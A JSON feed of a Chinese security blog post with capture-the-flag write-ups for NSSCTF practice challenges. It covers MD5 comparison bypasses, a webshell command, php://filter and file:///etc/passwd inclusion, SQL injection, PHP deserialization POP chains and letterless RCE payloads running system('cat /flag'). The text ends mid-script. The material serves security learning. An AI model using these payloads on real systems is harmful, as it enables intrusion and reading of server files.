{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog • All posts by \"nssctf精选\" category",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/04/26/nessctf/",
            "url": "https://hq185187.github.io/2023/04/26/nessctf/",
            "title": "NSSCTF精选",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php     highlight_file(__FILE__);    include &#x27;flag2.php&#x27;;       if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];       if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;           echo $flag;       &#125;       else &#123;           echo &quot;wrong!&quot;;       &#125;       &#125;   else &#123;       echo &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 弱类型比较<br>\n (1).0e 绕过<br>\n以下是一些字符串 md5 值以 0e 开头<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). 数组绕过<br>\n md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword 连<br>\n (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter 伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>这题用 file 协议也可以但是没有得到 flag<br>\n 可以这样:?file= <code>file:///etc/passwd</code> <br>\n 但是 <code>?file=file:///var/www/flag.php</code>  不行<br>\n<strong>想深刻了解伪协议的来这里</strong></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>学习 Linux 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / 列出根目录(\\)下的所有目录</span><br><span class=\"line\">发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件</span><br></pre></td></tr></table></figure>\n<p><strong>深刻了解 Linux 命令来这里</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>堆叠注入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">这两个还可以</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">失败</span><br></pre></td></tr></table></figure>\n<p>它的 SQL 查询语句是:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n 说真的我猜不出来<br>\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , 这样查询出了 Flag 表的所有内容<br>\n此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>返回一个列名为 1||flag, 列元素为 1flag 的值的表</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>第一步：绕过 file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost 传参: <code>welcome to the zjctf</code> <br>\n (2) data 协议<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n 根据提示的 useless.php 可以发现可以用伪协议读取<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n 第一步:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>经过 base64 解码得到 useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n 最终 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>检查可发现源代码注释部分有 flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; 网络 -&gt; 请求头 -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>注意:<br>\n <code>\\和后面三个字符算一个字符</code> <br>\n sql:``select * from admin where username=‘admin’ and password=’&quot;‘or’6]!r,b&quot;’;</p>\n<p>在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true</p>\n<p>关键是:<mark>’ or 1’</mark><br>\n答案肯定不止一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>复现:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>然后就是常规的数组绕过，0e 绕过了</p>\n<h3 id=\"8swpuctf-2021-新生赛hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-新生赛hardrce\">#</a> 8.[SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"无字母rce\"><a class=\"markdownIt-Anchor\" href=\"#无字母rce\">#</a> 无字母 rce</h4>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<p>此题 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>深刻学习无字母 rce 来这里</strong></p>\n<h3 id=\"9pop\"><a class=\"markdownIt-Anchor\" href=\"#9pop\">#</a> 9.pop</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;aaa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span> = <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Getflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;admin === <span class=\"string\">&#x27;w44m&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;passwd === <span class=\"string\">&#x27;08067&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;admin;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;passwd;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nono&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;w00m;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;w00m-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;w22m&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$w00m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;w00m&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$w00m</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>入口:w22m.destruct, 让 w22m 的 $woom 为 w33m 对象，调用 w33m 的 toString 方法，让 w33m 的 <code>w00m</code>  为 w44m 对象，w22m 为字符串’Getflag ()’, 就能调用 w44m 的 Getflag () 方法<br>\n构造脚本:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$admin</span>=<span class=\"string\">&#x27;w44m&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span>=<span class=\"string\">&#x27;08067&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w22m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w33m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w44m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w22m=<span class=\"string\">&#x27;Getflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span 